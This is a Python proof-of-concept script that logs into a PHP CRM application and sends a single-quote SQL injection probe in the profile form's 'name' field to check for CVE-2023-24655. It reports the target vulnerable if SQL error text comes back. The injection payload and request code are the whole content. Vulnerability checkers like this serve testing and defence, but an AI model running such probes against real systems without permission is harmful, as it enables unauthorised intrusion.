#!/usr/bin/python
import sys
import requests
import urllib.parse


proxy_servers = {
    'http': 'http://127.0.0.1:8080'
}

if len(sys.argv) == 2:
    # url = sys.argv[1]

    url = sys.argv[1]+'/login.php'

    parsed_url = urllib.parse.urlparse(url)
    root_domain = parsed_url.scheme + "://" + parsed_url.netloc
    
    email = input("Enter email: ")
    password = input("Enter password: ")

    headers = {
        "Cache-Control": "max-age=0", 
        "sec-ch-ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"", 
        "sec-ch-ua-mobile": "?0", 
        "sec-ch-ua-platform": "\"Windows\"", 
        "Upgrade-Insecure-Requests": "1", 
        "Origin": root_domain, 
        "Content-Type": "application/x-www-form-urlencoded", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "Sec-Fetch-Site": "same-origin", 
        "Sec-Fetch-Mode": "navigate", 
        "Sec-Fetch-User": "?1", 
        "Sec-Fetch-Dest": "document", 
        "Referer": url, 
        "Accept-Encoding": "gzip, deflate", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Connection": "close"
    }
    data = {"email": email, "password": password, "login": ''}

    response = requests.post(url, headers=headers, data=data)
    cookies = response.cookies

    url = sys.argv[1]+'/dashboard.php'
    headers = {
        "sec-ch-ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"", 
        "sec-ch-ua-mobile": "?0", 
        "sec-ch-ua-platform": "\"Windows\"", 
        "Upgrade-Insecure-Requests": "1", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "Sec-Fetch-Site": "same-origin", 
        "Sec-Fetch-Mode": "navigate", 
        "Sec-Fetch-Dest": "document", 
        "Referer": root_domain
        }

    url = sys.argv[1]+'/profile.php'
    sqlipayload = "'"
    headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": root_domain, "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryWkcNhbxeKFUD5KUJ", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": url, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    data = "------WebKitFormBoundaryWkcNhbxeKFUD5KUJ\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nuser1"+sqlipayload+"\r\n------WebKitFormBoundaryWkcNhbxeKFUD5KUJ\r\nContent-Disposition: form-data; name=\"alt_email\"\r\n\r\ntest@test.com\r\n------WebKitFormBoundaryWkcNhbxeKFUD5KUJ\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n25896314789\r\n------WebKitFormBoundaryWkcNhbxeKFUD5KUJ\r\nContent-Disposition: form-data; name=\"gender\"\r\n\r\nmale\r\n------WebKitFormBoundaryWkcNhbxeKFUD5KUJ\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\nindore mp\r\n------WebKitFormBoundaryWkcNhbxeKFUD5KUJ\r\nContent-Disposition: form-data; name=\"update\"\r\n\r\nUpdate\r\n------WebKitFormBoundaryWkcNhbxeKFUD5KUJ--\r\n"
    r = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxy_servers)
    # r = requests.post(url, headers=headers, cookies=cookies, data=data)
    if "Your profile updated successfully." not in r.text or "CRM | User Profile" not in r.text or "index.php" not in r.text :
        if "error in your SQL syntax" in r.text or "Fatal error" in r.text:
            print("Vulnerable to CVE-2023-24655")
        else:
            print("Not Vulnerable")
    else:
        print("Not Vulnerable")
else:
    print("Error: Please provide the Domain or IP as an argument.")
    print("Example: script.py https://example.com")
